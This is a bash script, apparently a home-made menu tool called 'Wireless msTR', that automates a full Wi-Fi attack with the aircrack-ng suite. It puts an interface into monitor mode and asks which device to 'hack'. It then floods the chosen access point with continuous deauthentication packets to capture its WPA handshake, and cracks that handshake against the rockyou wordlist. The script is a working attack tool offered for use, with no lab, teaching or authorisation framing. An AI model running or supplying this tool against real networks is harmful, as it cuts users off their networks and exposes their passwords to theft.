#!/bin/bash

# clear the screen
tput clear

# Get list of wireless interfaces
mapfile -t interfaces < <(ip -o link show | awk -F': ' '{print $2}' | grep -E '^wl|^wlan')

# Check if any wireless interface is found
if [[ ${#interfaces[@]} -eq 0 ]]; then
    echo "No wireless interfaces found."
    exit 1
fi

# Display interfaces with IP addresses
tput setaf 6
echo "Available Wireless Interfaces:"
tput sgr0

i=1
for iface in "${interfaces[@]}"; do
    ip_addr=$(ip -4 addr show "$iface" | awk '/inet/ {print $2}' | cut -d/ -f1)
    if [[ -z "$ip_addr" ]]; then
        ip_addr="No IP Assigned"
    fi
    echo "  $i) $iface  -  $ip_addr"
    ((i++))
done

echo
tput setaf 6
read -p "Select interface number: " iface_num
tput sgr0

# Validate input
if ! [[ "$iface_num" =~ ^[0-9]+$ ]] || (( iface_num < 1 || iface_num > ${#interfaces[@]} )); then
    echo "Invalid selection. Exiting..."
    exit 1
fi

iface="${interfaces[$((iface_num - 1))]}"
mon_iface="${iface}mon"

# MENU
tput cup 4 15
tput setaf 3
echo "Wireless msTR by BINARY"
tput sgr0

tput cup 6 17
tput rev
echo "M A I N - M E N U"
tput sgr0

tput cup 8 15
echo "1. Start Attacking"

tput cup 9 15
echo "2. Start Wireshark"

tput cup 10 15
echo "3. Stop Monitor Mode"

tput cup 11 15
echo "4. Quit"

tput cup 13 15
echo -n "Enter your choice [1-4] "
read choice

echo
tput sgr0

if [[ $choice -eq 1 ]]; then
    echo "Starting Monitor Mode on $iface"
    sudo airmon-ng start $iface
    sudo airmon-ng

    echo
    tput rev
    echo "Press ctrl+C when you find your desired device"
    tput sgr0
    sudo airodump-ng $mon_iface

    echo -n "Which device do you want to hack?"
    tput setaf 3
    echo -n " Please Enter the BSSID: "
    tput sgr0
    read bssid

    tput setaf 3
    echo -n "Channel Number: "
    tput sgr0
    read cnumber

    tput rev
    echo
    echo "Press ctrl+C when you capture the handshake"
    tput sgr0

    sudo xterm -e sudo airodump-ng -w hack.$bssid -c $cnumber --bssid $bssid $mon_iface & \
    sudo xterm -e sudo aireplay-ng --deauth 0 -a $bssid $mon_iface

    echo
    echo "Do you want to crack the handshake? [Y/N]"
    read handshake

    if [[ $handshake == "Y" || $handshake == "y" ]]; then
        sudo xterm -e sudo airmon-ng stop $mon_iface & \
        sudo aircrack-ng hack.$bssid-01.cap -w /usr/share/wordlists/rockyou.txt
    else
        sudo airmon-ng stop $mon_iface
        exit 0
    fi

elif [[ $choice -eq 2 ]]; then
    wireshark

elif [[ $choice -eq 3 ]]; then
    echo "Stopping Monitor Mode on ${mon_iface}"
    sudo airmon-ng stop "${mon_iface}"

else
    exit 0
fi
